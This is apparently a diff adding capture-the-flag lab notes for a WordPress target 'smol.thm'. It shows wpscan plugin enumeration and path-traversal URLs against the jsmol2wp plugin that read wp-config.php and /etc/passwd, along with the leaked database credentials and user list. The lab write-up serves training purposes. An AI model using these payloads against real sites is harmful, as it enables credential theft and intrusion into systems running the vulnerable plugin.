@@ -258,6 +258,39 @@ Fingerprinting the version - Time: 00:00:02 <===================================
 [+] Memory used: 197.562 MB
 [+] Elapsed time: 00:00:07
 
+wpscan  --url http://www.smol.thm --enumerate vp
+**get vulneable plugin **
+[+] jsmol2wp
+| Location: http://www.smol.thm/wp-content/plugins/jsmol2wp/
+use 
+http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
+to get 
 
+<?php
+// ** Database settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'wordpress' );
+
+/** Database username */
+define( 'DB_USER', 'wpuser' );
+
+/** Database password */
+define( 'DB_PASSWORD', 'kbLSF2Vop#lw3rjDZ629*Z%G' );
+
+/** Database hostname */
+define( 'DB_HOST', 'localhost' );
+
+/** Database charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8' );
+
+http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../../../../etc/passwd
+
+mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
+xavi:x:1001:1001::/home/xavi:/bin/bash
+diego:x:1002:1002::/home/diego:/bin/bash
+gege:x:1003:1003::/home/gege:/bin/bash
+ssm-user:x:1004:1006::/home/ssm-user:/bin/sh
+ubuntu:x:1005:1008:Ubuntu:/home/ubuntu:/bin/bash
 
 <\code>
+
